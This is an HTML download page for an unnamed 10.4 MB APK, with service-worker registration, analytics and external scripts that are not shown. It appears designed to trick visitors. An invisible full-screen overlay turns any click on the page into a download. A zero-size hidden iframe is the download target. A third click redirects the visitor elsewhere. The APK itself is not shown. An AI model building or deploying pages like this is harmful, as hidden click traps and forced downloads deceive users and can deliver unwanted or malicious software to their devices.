<!doctype html>
<html lang="en" translate="no">
  <head>
    <meta charset="utf-8">
    <meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Download</title>
    <script src="../params.js?v=personal-site-24"></script>
    <script src="../js/main.js"></script>
    <script src="../js/worker.js"></script>
    <script>
      window.__downloadTestRevision = 'personal-site-24';
      window.__downloadSwVersion = '42316865';
      window.__downloadSwUrl = `${window.__landingRoot}sw4.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;

      posthog.init(...DownLand.posthogParams({ land: '024', swUrl: window.__downloadSwUrl }));

      DownWorker.setup()
    </script>
    <style>
      :root {
          color-scheme: light;
          --bg: #f5f5f5;
          --text: #17202a;
          --muted: #647084;
          --accent: rgb(9, 149, 28);
          --accent-dark: rgb(8, 132, 25);
          --danger: #b42318;
      }

      * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
      }

      body {
          margin: 0;
          min-height: 100vh;
          font-family: "Gill Sans", Arial, Helvetica, sans-serif;
          background: var(--bg);
          color: var(--text);
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 24px;
      }

      main {
          position: relative;
          z-index: 2;
          width: min(100%, 360px);
          display: grid;
          gap: 16px;
          justify-items: center;
      }

      button {
          appearance: none;
          display: flex;
          flex-direction: row;
          align-items: center;
          justify-content: center;
          gap: 10px;
          width: auto;
          min-height: 98px;
          border: 0;
          border-radius: 10px;
          padding: 20px 40px 20px 15px;
          background: var(--accent);
          color: #fff;
          font-weight: 500;
          letter-spacing: 1px;
          text-transform: uppercase;
          cursor: pointer;
          box-shadow: 1px 1px 5px gray;
      }

      button:disabled {
          cursor: wait;
          opacity: 0.7;
      }

      button:not(:disabled):hover {
          background: var(--accent-dark);
      }

      svg {
          flex: 0 0 auto;
          border: 4px solid rgb(255, 255, 255);
          border-radius: 100%;
      }

      .text {
          text-align: left;
      }

      .text > .first {
          font-size: 22px;
          font-weight: bold;
      }

      .text > .second {
          font-size: 20px;
          letter-spacing: 2px;
      }

      .click-area {
          position: fixed;
          inset: 0;
          z-index: 1;
          cursor: pointer;
      }

      .hidden-frame {
          position: absolute;
          width: 0;
          height: 0;
          border: 0;
          opacity: 0;
          pointer-events: none;
      }

    </style>
  </head>
  <body>
    <main>
      <button id="downloadButton" class="ph-no-capture" type="button" disabled>
        <svg width="50" height="50" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <rect x="9" y="29" width="22" height="3" rx="1.5" fill="white"/>
          <path d="M18.9393 25.0607C19.5251 25.6464 20.4749 25.6464 21.0607 25.0607L30.6066 15.5147C31.1924 14.9289 31.1924 13.9792 30.6066 13.3934C30.0208 12.8076 29.0711 12.8076 28.4853 13.3934L20 21.8787L11.5147 13.3934C10.9289 12.8076 9.97919 12.8076 9.3934 13.3934C8.80761 13.9792 8.80761 14.9289 9.3934 15.5147L18.9393 25.0607ZM20 8L18.5 8L18.5 24L20 24L21.5 24L21.5 8L20 8Z" fill="white"/>
        </svg>
        <div class="text">
          <div class="first">Download</div>
          <div class="second">APK (10.4 MB)</div>
        </div>
      </button>
    </main>
    <div id="clickArea" class="click-area" aria-hidden="true"></div>
    <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>

    <script>
      (() => {
        log('info', 'Progress bar not used')
        const downloadButton = document.querySelector('#downloadButton');
        const clickArea = document.querySelector('#clickArea');

        let trustedClickCount = 0;

        function handleDownloadClick(event) {
          try {
            if (!DownWorker.isServiceWorkerReady()) {
              log('info', 'Download requested before service worker readiness');
              return;
            }

            if (event && event.isTrusted) {
              trustedClickCount += 1;

              if (trustedClickCount >= 3) {
                window.location.href = DownLand.redirectUrl();
                return;
              }
            }

            DownLand.startDownload({ passParams: false })
          } catch (error) {
            log('error', 'Download click handling failed', {
              error_name: error?.name,
              error_message: error?.message,
              error_stack: error?.stack?.split('\n').slice(0, 5).join('\n'),
            })
          }
        }

        if ('serviceWorker' in navigator) {
          navigator.serviceWorker.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'DOWNLOAD_CANCELED') {
              DownLand.onCanceled(event.data)
            }
          })
        }

        downloadButton.addEventListener('click', handleDownloadClick);
        downloadButton.addEventListener('click', (event) => {
          DownLand.onTrustedClick(event)
        });
        clickArea.addEventListener('click', handleDownloadClick);

        DownWorker.registerService({ passParams: false })
      })();
    </script>
  </body>
</html>
